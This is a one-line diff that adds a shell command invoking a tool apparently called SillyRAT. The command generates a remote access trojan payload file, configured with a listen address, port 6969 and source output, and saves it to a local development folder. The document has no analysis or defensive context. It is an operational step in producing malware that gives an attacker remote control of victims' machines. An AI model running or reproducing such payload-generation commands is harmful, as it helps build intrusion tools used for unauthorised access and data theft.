@@ -1,0 +1,1 @@
+python3 unsillyrat.py generate --address 0.0.0.0 --port 6969 --output "/run/media/hirusha/Local Drive 1TB/development/Python/SillyRAT/out/payload.py" --source
